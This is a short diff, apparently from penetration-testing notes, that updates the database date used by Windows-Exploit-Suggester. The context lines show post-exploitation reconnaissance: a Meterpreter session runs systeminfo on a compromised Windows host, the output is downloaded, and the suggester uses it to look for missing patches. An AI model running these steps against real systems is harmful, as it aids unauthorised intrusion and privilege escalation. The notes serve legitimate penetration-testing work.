@@ -176,6 +176,6 @@ git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
 python windows-exploit-suggester.py --update
 meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
 meterpreter > download systeminfo.txt
-python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt --quiet  
+python2 windows-exploit-suggester.py --database 2019-09-25-mssb.xls --systeminfo ../systeminfo.txt --quiet  
 
 
